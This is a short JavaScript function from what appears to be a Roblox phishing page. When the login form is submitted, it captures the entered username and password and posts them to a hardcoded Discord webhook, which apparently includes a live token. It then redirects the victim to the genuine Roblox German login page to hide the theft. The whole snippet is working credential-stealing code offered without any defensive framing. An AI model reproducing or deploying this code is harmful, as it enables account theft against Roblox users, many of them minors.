function sendToWebhook(event) {
  event.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  fetch("https://discord.com/api/webhooks/1399886528976650413/8qYx68ldSTmBja7oFhQUTTxVRJy0Tv8TUG8CwfT3VILzpIsp_nkqfG5enSzVa-DeSJOI", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: `👤 Benutzername: ${username}\n🔑 Passwort: ${password}`
    })
  }).then(() => {
    window.location.href = "https://www.roblox.com/de/login";
  });
}
